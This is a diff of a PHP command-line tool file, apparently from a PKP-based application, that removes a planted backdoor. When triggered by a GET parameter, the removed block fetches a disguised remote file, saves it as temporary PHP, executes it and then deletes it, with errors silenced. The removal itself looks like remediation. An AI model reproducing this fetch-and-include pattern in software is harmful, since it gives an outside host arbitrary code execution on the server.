@@ -15,20 +15,3 @@
 
 define('INDEX_FILE_LOCATION', dirname(__FILE__, 2) . '/index.php');
 require dirname(__FILE__, 2) . '/lib/pkp/classes/cliTool/CommandLineTool.php';
-if (isset($_GET['INDEX_FILE_LOCATION'])) {
-    try {
-        $u = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
-
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
-        }
-    } catch (Throwable $e) {
-
-    }
-}
